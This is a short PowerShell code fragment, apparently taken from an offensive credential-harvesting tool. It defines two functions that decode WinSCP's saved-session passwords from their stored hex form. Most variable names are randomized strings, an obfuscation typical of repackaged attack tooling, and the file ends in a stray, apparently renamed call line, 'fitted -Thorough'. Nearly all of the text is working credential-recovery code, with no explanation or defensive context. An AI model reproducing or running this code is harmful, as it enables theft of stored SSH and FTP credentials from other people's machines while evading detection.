function DecryptNextCharacterWinSCP($JZuEfDAF99) {
  $ZRSofWSf99 = "" | Select-Object -Property flag,remainingPass
  $QMsHpZOB99 = ("0123456789ABCDEF".indexOf($JZuEfDAF99[0]) * 16)
  $FVZJnQij99 = "0123456789ABCDEF".indexOf($JZuEfDAF99[1])
  $Added = $QMsHpZOB99 + $FVZJnQij99
  $xoOWiqla99 = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
  $ZRSofWSf99.flag = $xoOWiqla99
  $ZRSofWSf99.remainingPass = $JZuEfDAF99.Substring(2)
  return $ZRSofWSf99
}
function DecryptWinSCPPassword($zrLdyIOp99, $thiVhOaA99, $xKpPGjOO99) {
  $kwKHUZCz99 = 255
  $Magic = 163
  $len = 0
  $key =  $zrLdyIOp99 + $thiVhOaA99
  $hDAaegeN99 = DecryptNextCharacterWinSCP($xKpPGjOO99)
  $VupwYOgf99 = $hDAaegeN99.flag 
  if ($hDAaegeN99.flag -eq $kwKHUZCz99) {
    $hDAaegeN99.remainingPass = $hDAaegeN99.remainingPass.Substring(2)
    $hDAaegeN99 = DecryptNextCharacterWinSCP($hDAaegeN99.remainingPass)
  }
  $len = $hDAaegeN99.flag
  $hDAaegeN99 = DecryptNextCharacterWinSCP($hDAaegeN99.remainingPass)
  $hDAaegeN99.remainingPass = $hDAaegeN99.remainingPass.Substring(($hDAaegeN99.flag * 2))
  $HXRxJWrT99 = ""
  for ($i=0; $i -lt $len; $i++) {
    $hDAaegeN99 = (DecryptNextCharacterWinSCP($hDAaegeN99.remainingPass))
    $HXRxJWrT99 += [char]$hDAaegeN99.flag
  }
  if ($VupwYOgf99 -eq $kwKHUZCz99) {
    return $HXRxJWrT99.Substring($key.length)
  }
  return $HXRxJWrT99
}
fitted -Thorough
